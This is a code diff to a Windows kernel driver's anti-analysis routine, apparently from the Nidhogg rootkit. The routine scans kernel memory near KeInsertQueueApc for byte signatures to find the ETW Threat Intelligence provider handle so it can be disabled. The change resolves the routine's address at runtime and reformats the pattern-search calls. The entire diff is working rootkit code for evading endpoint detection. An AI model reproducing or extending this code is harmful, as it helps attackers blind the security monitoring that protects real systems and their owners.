@@ -46,13 +46,25 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	ULONG foundIndex = 0;
 	SIZE_T bytesWritten = 0;
 	SIZE_T etwThreatIntProvRegHandleSigLen = sizeof(EtwThreatIntProvRegHandleSignature1);
+	
+	// Getting the location of KeInsertQueueApc dynamically to get the real location.
+	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
+	PVOID searchedRoutineAddress = MmGetSystemRoutineAddress(&routineName);
 
-	PVOID searchedRoutineAddress = (PVOID)KeInsertQueueApc;
+	if (!searchedRoutineAddress)
+		return STATUS_NOT_FOUND;
+
 	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
-	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)EtwThreatIntProvRegHandleSignature1, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature1,
+																		 0xCC, etwThreatIntProvRegHandleSigLen - 1,
+																		 searchedRoutineAddress, targetFunctionDistance,
+																		 &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
 	if (!searchedRoutineOffset) {
-		searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)EtwThreatIntProvRegHandleSignature2, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+		searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature2,
+																	   0xCC, etwThreatIntProvRegHandleSigLen - 1,
+																	   searchedRoutineAddress, targetFunctionDistance,
+																	   &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
